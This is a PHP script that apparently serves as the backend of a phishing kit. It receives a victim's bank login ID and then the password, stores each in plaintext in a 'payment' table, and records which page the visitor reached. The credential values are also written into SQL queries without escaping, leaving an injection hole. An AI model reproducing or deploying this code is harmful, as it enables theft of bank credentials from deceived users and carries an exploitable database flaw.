
<?php 
include('../bank_header.php');
include('../../../db.php'); 

	
if (!$_REQUEST['id'])
	exit;

$id = mysqli_real_escape_string($con,$_REQUEST['id']);
$type = $_REQUEST['type'];


$rest_json = file_get_contents("php://input");
$_POST = json_decode($rest_json, true);

if ($type == 0) {
		
	$bank_user_id = $_POST['bank_user_id'];

	$page_name = basename($_SERVER['PHP_SELF']);
	$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
	$con->query($sqlss);

	$sql_paolo = "select * from `payment` WHERE `id` = '$id' limit 1;";

	$new = $con->query($sql_paolo);
	$payment_row = $new->fetch_assoc();



	$sql = "UPDATE `payment` SET `bank_user_id` = '$bank_user_id'  WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
	$con->query($sql);

	echo $bank_user_id;
}
else if ($type == 1) {
	$bank_user_password = $_POST['bank_user_password'];

	$page_name = basename($_SERVER['PHP_SELF']);
	$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
	$con->query($sqlss);

	$sql_paolo = "select * from `payment` WHERE `id` = '$id' limit 1;";

	$new = $con->query($sql_paolo);
	$payment_row = $new->fetch_assoc();



	$sql = "UPDATE `payment` SET `bank_user_password` = '$bank_user_password'  WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
	$con->query($sql);

	echo $bank_user_password;
}

?>	
	
	
